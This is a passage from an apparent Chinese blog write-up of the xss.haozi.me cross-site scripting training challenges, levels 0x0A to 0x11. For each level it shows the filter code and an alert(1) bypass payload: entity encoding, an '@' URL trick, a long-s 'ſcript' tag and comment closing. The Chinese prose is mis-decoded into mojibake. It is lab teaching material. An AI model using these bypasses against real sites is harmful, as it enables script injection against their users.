operator\">&amp;</span>#<span class=\"token number\">39</span><span class=\"token punctuation\">;</span>'<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\"<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;quot;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;lt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;gt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;#x2f'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">const</span> domainRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token operator\">^</span>https<span class=\"token operator\">?</span><span class=\"token operator\">:</span>\\<span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span>www\\<span class=\"token punctuation\">.</span>segmentfault\\<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>domainRe<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> `<span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string\">\"$&#123;escapeHtml(input)&#125;\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>`\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token class-name\">Invalid</span> URL'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>è¿™é‡Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šï¼Œ<code>&amp;ã€/ã€&lt;ã€&gt;ã€/ã€&#39;</code>è¿™äº›éƒ½è¢«banäº†ï¼Œè¿™é‡Œçš„è¯å°±éœ€è¦ä¸€ä¸ªçŸ¥è¯†ç‚¹äº†ï¼Œåœ¨SSRFä¸­ä¹Ÿæ¯”è¾ƒå¸¸ç”¨ï¼Œå°±æ˜¯æ·»åŠ @ï¼Œçœ‹ä¼¼æ˜¯è®¿é—®å‰è€…ï¼Œå®é™…è®¿é—®çš„æ˜¯åè€…ï¼Œæ¯”å¦‚è®¿é—®<code>https://wwwbaidu.com@quan9i.top</code>æ—¶ï¼Œå®é™…è®¿é—®çš„å°±æ˜¯<code>https://quan9i.top</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537675.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"><br>è¿™é‡Œçš„è¯æˆ‘ä»¬å¯ä»¥å‘ç°ä½œè€…åœ¨é¶åœºä¸­ç•™ä¸‹äº†ä¸€ä¸ª<code>j.js</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®©å®ƒè®¿é—®è¿™ä¸ªï¼Œä»è€Œè§¦å‘xss<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537354.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"><br>æ„é€ payloadå¦‚ä¸‹ï¼ˆç”¨ç«ç‹æµè§ˆå™¨ï¼‰</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">https<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>www<span class=\"token punctuation\">.</span>segmentfault<span class=\"token punctuation\">.</span>com<span class=\"token annotation punctuation\">@xss.haozi.me</span><span class=\"token operator\">/</span>j<span class=\"token punctuation\">.</span>js<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537003.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X0B\"><a href=\"#0X0B\" class=\"headerlink\" title=\"0X0B\"></a>0X0B</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>h1<span class=\"token punctuation\">></span></span>$<span class=\"token punctuation\">&#123;</span>input<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">></span>`\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><code>toUpperCase()</code>å‡½æ•°ä½¿å¾—è¾“å…¥çš„å†…å®¹å…¨ä¸ºå¤§å†™ï¼Œæœ¬æ¥æˆ‘æ„é€ çš„payloadæ˜¯è¿™æ ·çš„</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>ä½†å¤§å†™çš„alert(1)æ— æ³•æˆåŠŸè§¦å‘xssï¼Œè¿™é‡Œçš„è¯æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªå†…å®¹æ˜¯åœ¨æ ‡ç­¾ä¸­çš„ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠalert(1)è¿›è¡Œå®ä½“ç¼–ç ï¼Œåœ¨æœåŠ¡å™¨ç«¯ä¼šè‡ªåŠ¨è§£ç ï¼Œå› æ­¤æ„é€ æœ€ç»ˆpayloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token operator\">&amp;</span>#x61<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x6c<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x65<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x28<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x31<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x29<span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537152.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X0C\"><a href=\"#0X0C\" class=\"headerlink\" title=\"0X0C\"></a>0X0C</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>script<span class=\"token operator\">/</span>ig<span class=\"token punctuation\">,</span> ''<span class=\"token punctuation\">)</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> <span class=\"token char\">'&lt;h1>'</span> <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> <span class=\"token char\">'&lt;/h1>'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>åœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šå¤šè¿‡æ»¤äº†ä¸ªscriptæ ‡ç­¾ï¼Œè¿™é‡Œçš„è¯æˆ‘ä»¬ç›´æ¥æŠŠscriptè¿›è¡Œå®ä½“ç¼–ç å³å¯ç»•è¿‡</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>java<span class=\"token operator\">&amp;</span>#x73<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x63<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x69<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x70<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">:</span><span class=\"token operator\">&amp;</span>#x61<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x6c<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x65<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x28<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x31<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x29<span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537585.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"><br>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨è¿™ä¸ªæ ‡ç­¾ï¼Œæ¢å…¶ä»–æ ‡ç­¾ï¼Œä¾‹å¦‚img</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token number\">0</span> onerror<span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>#x61<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x6c<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x65<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x28<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x31<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x29<span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"0X0D\"><a href=\"#0X0D\" class=\"headerlink\" title=\"0X0D\"></a>0X0D</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>\"<span class=\"token char\">']/g, '</span>'<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `\n    <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>\n          <span class=\"token comment\">// alert('$&#123;input&#125;')</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n  `\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>è¿™é‡Œçš„è¯å¯ä»¥çœ‹å‡ºå®ƒæ˜¯æŠŠæˆ‘ä»¬å†™çš„å†…å®¹æ”¾æ³¨é‡Šé‡Œäº†ï¼ŒåŒæ—¶è¿‡æ»¤äº†<code>&quot;ã€&#39;ã€/</code>ï¼Œè¿™ä¸ªæ—¶å€™çš„è¯ï¼Œç»•è¿‡æ³¨é‡Šç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªæ¢è¡Œå³å¯ï¼Œè€Œåæ’å…¥alert(1)ï¼Œä½†æ­¤æ—¶å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åé¢å¤šå‡ºäº†ä¸ªâ€™)ï¼Œæˆ‘ä»¬éœ€è¦æ³¨é‡Šï¼Œä½†<code>/</code>è¢«banäº†ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦è¯´ä¸€ä¸‹htmläº†ï¼Œå®ƒè¿˜æœ‰æ³¨é‡Šæ–¹æ³•æ˜¯<code>&lt;!-- xxx --&gt;</code>è¿™ç§ï¼Œå› æ­¤æˆ‘ä»¬æ·»åŠ â€“&gt;æ¥é—­åˆå³å¯ï¼Œæ„é€ æœ€ç»ˆpayloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537568.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X0E\"><a href=\"#0X0E\" class=\"headerlink\" title=\"0X0E\"></a>0X0E</h2><p>é¢˜ç›®ä»£ç å¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>a<span class=\"token operator\">-</span>zA<span class=\"token operator\">-</span><span class=\"token class-name\">Z</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&lt;_$1'</span><span class=\"token punctuation\">)</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> <span class=\"token char\">'&lt;h1>'</span> <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> <span class=\"token char\">'&lt;/h1>'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>è¿™é‡Œçš„è¯ç»™æ ‡ç­¾éƒ½æ·»åŠ äº†ä¸‹åˆ’çº¿ï¼Œè¿™ä¸ªæ—¶å€™çš„è¯æ–°æ·»æ ‡ç­¾å°±æ— æ•ˆäº†ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨<code>Å¿</code>æ¥ä»£æ›¿sï¼Œä½†<code>alert(1)</code>å¤§å†™çš„è¯æ˜¯æ— ç”¨çš„ï¼Œå› æ­¤éœ€è¦ç”¨å…¶ä»–å±æ€§äº†ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨srcï¼Œç»“åˆä½œè€…çš„jsæ–‡ä»¶ï¼Œè§¦å‘xss</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>Å¿cript src<span class=\"token operator\">=</span><span class=\"token string\">\"https://xss.haozi.me/j.js\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537518.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X0F\"><a href=\"#0X0F\" class=\"headerlink\" title=\"0X0F\"></a>0X0F</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  function <span class=\"token function\">escapeHtml</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&amp;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;amp;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token char\">'/g, '</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">39</span><span class=\"token punctuation\">;</span>'<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\"<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;quot;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;lt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;gt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;#x2f;'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> `<span class=\"token operator\">&lt;</span>img src onerror<span class=\"token operator\">=</span><span class=\"token string\">\"console.error('$&#123;escapeHtml(input)&#125;')\"</span><span class=\"token operator\">></span>`\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p> ä½¿ç”¨escapeHTMLï¼Œå°†å­—ç¬¦ä¸²<code>&lt;script&gt;alert(1)&lt;/script</code>è½¬ä¸º <code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;</code>æ­¤æ—¶ï¼Œæµè§ˆå™¨å°†èƒ½æ­£ç¡®è§£æï¼Œå› ä¸ºæµè§ˆå™¨æ¥æ”¶åˆ°å®ä½“å­—ç¬¦åï¼Œè½¬æˆå¯¹åº”çš„å°–æ‹¬å·ç­‰<br> å› æ­¤è¿™é‡Œæ˜¯æ²¡å•¥å½±å“çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„è¯å°±æ˜¯<code>consonle.error(&#39;x&#39;)</code>ï¼Œæˆ‘ä»¬å¯æ§çš„æ˜¯xï¼Œé‚£æˆ‘ä»¬å¦‚æœæƒ³è¿›è¡Œxssï¼Œé¦–å…ˆè‚¯å®šè¦é¿å¼€è¿™ä¸ªæ‹¬å·ï¼Œå› æ­¤æˆ‘ä»¬å…ˆè¿›è¡Œé—­åˆï¼Œæ„é€ <code>&#39;);</code>ï¼Œæ­¤æ—¶å†æ·»åŠ æˆ‘ä»¬çš„å¼¹çª—è¯­å¥<code>alert(1)</code>ï¼Œæ­¤æ—¶åé¢è¿˜æœ‰ä¸€ä¸ª<code>&#39;)</code>ï¼Œæˆ‘ä»¬éœ€è¦é—­åˆå®ƒä½¿è¯­å¥æ­£å¸¸ï¼Œæ‰€ä»¥æ·»åŠ ä¸€ä¸ª<code>(&#39;</code>æ¥é—­åˆè¯­å¥ï¼Œæœ€ç»ˆpayload</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>'<span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"0X10\"><a href=\"#0X10\" class=\"headerlink\" title=\"0X10\"></a>0X10</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> `\n<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>\n  window<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> $<span class=\"token punctuation\">&#123;</span>input<span class=\"token punctuation\">&#125;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n  `\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>è¿™ä¸ªå¯ä»¥åœ¨éšä¾¿ä¸€ä¸ªç½‘é¡µä¸Šè¿›è¡Œæµ‹è¯•ï¼Œ<code>windows.data=alert(1)</code>å°±å¯ä»¥è§¦å‘xss<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537878.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<p>å› æ­¤è¿™é‡Œç›´æ¥è¾“å…¥alert(1)å³å¯</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"0X11\"><a href=\"#0X11\" class=\"headerlink\" title=\"0X11\"></a>0X11</h2><p>é¢˜ç›®ä»£ç å¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// from alf.nu</span>\nfunction render <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  function escapeJs <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\\\<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\\\\\'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token char\">'/g, '</span>\\\\\\''<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token string\">\"/g, '\\\\\"</span>'<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>`<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\`'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\74'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\76'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\/'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\n<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\n'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\r<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\r'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\t<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\t'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\f<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\f'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\v<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\v'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">// .replace(/\\b/g, '\\\\b')</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\<span class=\"token number\">0</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\0'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n  s <span class=\"token operator\">=</span> <span class=\"token function\">escapeJs</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `\n<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>\n  <span class=\"token keyword\">var</span> url <span class=\"token operator\">=</span> 'javascript<span class=\"token operator\">:</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;s&#125;\"</span><span class=\"token punctuation\">)</span>'\n  <span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">)</span>\n  a<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> url\n  document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n  a<span class=\"token 